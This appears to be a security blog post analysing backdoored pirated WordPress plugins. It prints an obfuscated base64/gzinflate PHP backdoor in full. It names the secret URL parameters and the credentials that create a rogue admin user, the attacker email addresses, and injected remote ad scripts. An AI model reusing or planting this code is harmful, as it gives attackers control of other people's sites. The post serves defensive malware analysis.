@@ -1,0 +1,107 @@
+Unmasking “Free” Premium WordPress Plugins
+
+WordPress has a large repository of free plugins (currently 30,000+) that can add almost any functionality to your blog. However, there is still a market for premium plugins. Premium plugins are especially popular when they help blogs make money: eCommerce, SEO, affiliate and customer management, and so on.
+Such plugins may be really great and well worth their price, but not many webmasters are ready to pay for plugins, especially when they can find “free” or “nulled” versions of the same plugins on the Internet. All they need to do is search Google for [<plugin-name> free download].
+Getting something valuable for free may sound great, however, in most cases, you won’t get what you expect. After all, you should ask yourself the question, why would someone spend their time to steal software, and then post it to various sites and forums where they can’t even count on any advertising revenue? Usually, the answer is that they expect to take advantage of the sites that install the software they post. How? By adding some undisclosed functionality to the stolen plugins like backdoors, ads, hidden links, and SPAM.
+In this post, we’ll talk about “patched” malicious premium plugins. We’ll talk about what they do, how they work, and about websites that build their businesses around stolen WordPress themes and plugins.
+
+SEOPressor
+Retail Price: $47+
+We found this plugin while cleaning a severely infected site. It was in the wp-content/plugins/seo-pressor(gratuit) directory. Seeing gratuit (translates to “free”) itself in the directory name made the plugin look suspicious. A scan of the website revealed the following code inside the seo-pressor(gratuit)/classes/central.class.php file:
+eval (gzinflate( base64 _decode("NdLJlmNQAADQX8muqo6FIKZTXV0HEUKixCybPsIzBOGZHu/ruzf9B3dxd9+/f333Zb8DS9Ls3gtcvfImmcD7IxkBd/
+iTgbTLwPublZ2MEZ6RJB1vkD/yYYV8OdYhuTCXwq+1882AVrOXpUJzbr507gkxWLZRYOfc5llCsyRMdIZxv+sW6N0ICq6h6Bm/
+5us1pVADcjlCnsm5tttpIWyHnzkwyMqVJTOupEbLBCE50lcVtKnLKc999/JlZDWRcO8yqve1TKRiND7ZXnsJBW5L0zwJVuFQMQmXgTPLNZnw/PCObVCZ+YO56TOih0TzlIvhqgqpH+jUUgfVXVFrVPDRk6eKdDL1aNQgr2J5wB5Z0GErnQ3muWGF6ktS9a27sYinLuRjpUrQK6GktGCw+pMNqVq84FQCnQBKqUw3vjvT6B8ZyJAgDuEcimHia1660nhruAX71qNCOBjmvMw9q6DN4ukIgufPUyQNmX9ao1YPak6p96OGzSZoj86NPlkXEWnUvSBQzJouKDYxdsKoOTDeA3sxP17dWfxxs4S8HyeWkcYWsmMYieaS2TVR0RfOgw2Xygbrv6I03xIkKlQNfGUTmj4wsOgQdvailUayKYpaL8EVwG1aJTgcMufcgbogTeEAtf1pXp6EzYiru0XYPkcCT/I6+vp623187D4+d/+L/QU=" )) );
+It’s quite typical for premium plugins to encrypt and obfuscate their code. They try to prevent the stealing of their “know-hows” and algorithms, and they make it more difficult to reuse certain files outside of their plugins. We respect their right to do it, but we always try to decode such encrypted blocks to figure out whether it’s legitimate code or something added by hackers.
+In this case, after a few rounds of decoding we saw this:
+
+There are two functions hooked to the “wp_head” event, which means that they are executed on every blog page load.
+The first function, my_wpfunww7x(), creates a user called “wordpress” with the password “gh67io9Cjm” that has administrator permissions. This only happens if the page URL has the cms GET parameter with a value of jjoplmh. E.g. http://blog.example.com/?cms=jjoplmh.
+The second function, my_wpfunww7c8(), checks if the wordpress user exists. If there is no such a user, it sends an email to “thomasza@gmx.com” with the blog URL in the subject, and the “WordPress Plugin” in the body of the email.
+It’s easy to see the logic behind these two functions:
+
+When a webmaster installs this plugin, it immediately (on the first blog page load) sends an email with the blog address to the attacker (thomasza@gmx.com).
+Then the attacker comes to the blog and loads it passing the ?cms=jjoplmh parameters in the URL.
+As a result, a new admin user (with the “wordpress” name and a known password) is created.
+The attacker can now log into WordPress with admin permissions and do whatever he wants with the blog, with the whole site (e.g. injecting a backdoor to some theme or plugin, and then using it to upload malicious files to the server), with the server account (all sites that share the same account can be easily compromised now) and even with the whole server.
+
+“Free” Plugins That Come With Spam
+Let’s move to the next set of “free” premium plugins.
+We worked with a server that sent out tons of spammy emails. We found the script that did it and deleted it. This immediately cut the mail queue by 95% but there were still quite a few emails there. When we checked the headers, we saw that most of them had only the “WordPress plugin” line in their bodies, and were sent to either “wordpressslog@yandex.com” or “jaqqscigs@gmail.com“. The headers also mentioned the sites that sent those emails, so we only needed to check plugins on those sites.
+Restrict Content Pro
+Retail Price: $42+
+First we found this file: wp-content/restrict-content-pro/includes/sidebar.php – http://pastie.org/8966576 (slightly trimmed). This file contains 72,847 bytes and only one line of code that looks like some commented out code from the ” option-tree” plugin. However, if you inspect the code more thoroughly, you’ll notice the following 243 bytes in the very middle are not a comment (formatted for readability):
+
+Looks familiar doesn’t it? The only difference from what we saw in the “gratuit” SEOPressor is a slightly different wp-head hook function name (my_wpfunww458), and base64-encoded email address ( d29yZHByZXNzc2xvZ0B5YW5kZXguY29t ), which gives us wordpressslog@yandex.com after decoding. Bingo!
+But wait, this code only sends emails with the blog URL to the attacker. Where is the code that creates a rogue user? Good, you noticed it.
+The code was in the wp-content/restrict-content-pro/includes/class.php file – http://pastie.org/8966599 (trimmed trailing comment). Again, 90,390 bytes of commented out, and one line of code with 288 bytes of payload in the middle, which is the missing part that created the rouge “wordpress” user.
+
+This time it needs the ?cms=go URL parameter.
+OK, now we have both malicious functions, but how does WordPress know that it needs to call them? In the case of the SEOPressor plugin, the malicious functions were injected into a legitimate plugin file that WordPress loaded when it loaded the plugin. Now we have two standalone files that have no legitimate code at all. Moreover, they don’t belong to that plugin. The answer is that the attacker modified the main plugin file wp-content/restrict-content-pro/restrict-content-pro.php and added the following line of code there:
+... include'includes/class.php'; include'includes/sidebar.php';
+Flat Skin Pack Extension
+Retail Price: $6
+Then, with minor modifications, we found similar malicious files under wp-content/ubermenu-skins-flat.
+
+ubermenu-skins-flat/help/js/menu.php – sends the blog URL to jaqqscigs@gmail.com (amFxcXNjaWdzQGdtYWlsLmNvbQ==)
+ubermenu-skins-flat/help/js/class.php – creates a rogues “wordpress” users with the admin permissions.
+ubermenu-skins-flat/ubermenu-skins-flat.php – includes the above two files.
+
+Origin of the “Patched” Plugins
+When we talked with the webmaster about the origin of those “plugins”, he said that he took them from wplist.org and was surprised that he shouldn’t have trusted a site with such a cool domain name.
+We checked that site and found that the plugins were submitted there by a user named andrewp in June, 2013. In total, he submitted five plugins — all of them had those malicious backdoors.
+
+Restrict Content Pro WordPress Plugin V1.5.5
+Ideas! v1.1.6 Interactive feedback and commenting system
+Ultimate Ajax Grid WordPress Plugin
+User Profiles Plugin for WordPress
+UberMenu – Flat Skin Pack WordPress Plugin V1.0.3
+
+We did a little digging and found out that the user, andrewp, has only ever posted “patched” plugins with backdoors. The question becomes, are such submissions of “patched” plugins typical for this site, or, was this just an exception that took place back in June, 2013? To figure it out, we downloaded a few random plugins from wplist.org and its mirror site wplocker.com and checked them.
+It didn’t take long to find a few “patched” plugins submitted in February to March of 2014 by the site admin (not some third-party user).
+
+Go – Responsive Pricing & Compare Tables (go_pricing)
+FormCraft
+Custom Scrollbar WordPress
+Theia Sticky Sidebar
+GravityForms
+
+Our conclusion is that this practice of posting plugins containing malicious code is typical for these sites. Moreover, when in their very own comments area people warn about malicious “extras” they have found in the plugins, the admin readily replaces them with “retail” versions. Why not do it from the very beginning?.
+I’m not going to link directly to that site, but you can find those comments using this Google search.
+Spamcheckr Patch
+The “patch” has changed since last June. While the added files look the same (one long line of commented out PHP code with a short payload in the middle of the comments), they work differently. In all of them, the payload looked more or less like this (added formatting for readability):
+
+The variations of this payload include different function names, different URLs in the $addressd variable (hxxp://spamcheckr .com/check.php and hxxp://spamcheckr .com/l.php), as well as the base64 encoded URL: base64_decode(“c3BhbWNoZWNrci5jb20vY2hlY2sucGhw“);
+What this code does is inject content from the spamcheckr .com URL into the header of WordPress pages for users not logged in (wordpress_test_cookie not set). However, it doesn’t happen every time. The chances of an injection are 1 in 20 (mt_rand(1,20) == 1), so you might need to browse quite a few pages before you can detect it.
+Adwat.ch Scripts
+Behind the spamcheckr URL’s we currently see these adwat.ch scripts:
+<script type="text/javascript">
+var adwatch_id = 234224;
+var adwatch_advert = "int";
+var exclude_domains = ['affiliates.playboy.com', 'elperutienetalento.com', 'skeezybabes.com', 'wp-admin', 'kamapisachi.info', 'nude', 'sex', 'porn', 'naked', 'fuck', 'cock', 'penis', 'tits', 'boobs', 'pussy', 'wp-login', 'hillaryClinton2016.com', 'mpmgworld.com', 'madeforher.in'];
+</script>
+<script type="text/javascript" src="http://adwat .ch/js/easylink.js"></script>
+Adwat.ch is a URL shortening service that shows full-page ads that can’t be closed for a few seconds when people click on their short URL’s. Since no one likes obtrusive ads, and there are many better alternative services out there, adwat.ch shares ad revenue with people who shrink URLs using their service to encourage people to use their site.  The injected code participates in the revenue sharing program with the ID 234224.
+Alternative Spamcheckr Payloads
+The injected code doesn’t have to always be that adwat.ch script. It’s being downloaded from the spamcheckr server and can be pretty much anything: benign, obtrusive or even outright malicious.
+For example, some people reported that infected sites also redirected to adf.ly ads. We noticed some periods of inactivity when spamcheckr returned the following Google Analytics code:
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+ga('create', 'UA-27917097-1', 'test.com');
+ga('send', 'pageview');
+</script>
+This Google Analytics ID UA-27917097-1 also has a long history of being used in unwanted code that some plugins injected into WordPress pages. Two years ago, people reported an older GA code with that very ID being injected along with hidden spammy links.
+If you think that ads and Google Analytics code doesn’t sound like a security threat, think again. For example, spamcheckr .com may eventually return some exploit code that will attack site visitors or redirect them to a malicious site.
+Pirated Software. Is it Worth it?
+Everyone knows that using pirated software is bad. Not just ethically bad. It’s stupid. Why trust people who don’t respect property, and whose business is stealing? Just ask yourself a question, where did they get so many paid software titles, and why do they give it away for free?
+For some reason, many people download free plugins and use them on their sites. We see threads about this on WordPress.org forum. Note how they mention “not original“, “not official” when specifying the plugins where they found the malicious code. If you know it’s not original, why install it on your server?
+It’s not always about the money. Oftentimes, it’s likely just a lack of knowledge. We’ve found these plugins on websites that made decent money for their owners, on sites that used upscale hosting solutions, and on websites with owners who were willing to pay for extra services. What makes them search for pirated plugins when they can afford paying for original plugins? What makes them install pirated plugins and risk losing site reputation through unwanted ads, redirects and malware? What makes them install pirated plugins if they may give control of their sites to hackers (via backdoors)? It is probably a lack of knowledge.
+
+Think about what you install on your server. Any third-party software that you install can do pretty much anything with your site, and in some cases, with your server. Not all functions may be declared. Many themes and plugins consist of thousands of lines of code and it takes only one line to add a backdoor that can potentially devastate your site. So if you install a plugin or theme, you’d better trust its author and the site where you downloaded it from. On the road between the software developer and you, anyone could potentially make changes.
+Please, be pragmatic. Get software only from reputable sources. If you need a plugin, try searching for a free one in the official WordPress repository. There are 30,000+ plugins there. This repository has very strict inclusion terms, and should be your only source of free plugins.
+If a plugin you need is not free, then buy it directly from its developer. Don’t search for “free” copies. Don’t trust links in forums or on sites that offer something that doesn’t belong to them. If you see some really appealing plugin description with a shady download link, then try a Google search for the original version of that plugin.
+And finally, do you really need one more plugin? Can you do without it? Even 100% legitimate plugins have overhead: they make your site slower, they may not get along with your existing plugins, and they may have known and unknown security holes. The more third-party software installed on your server, the more you expose your site has to potential security issues. Try to stick to a bare minimum.
+
+Following these rules may save you a lot of troubles in the long run.
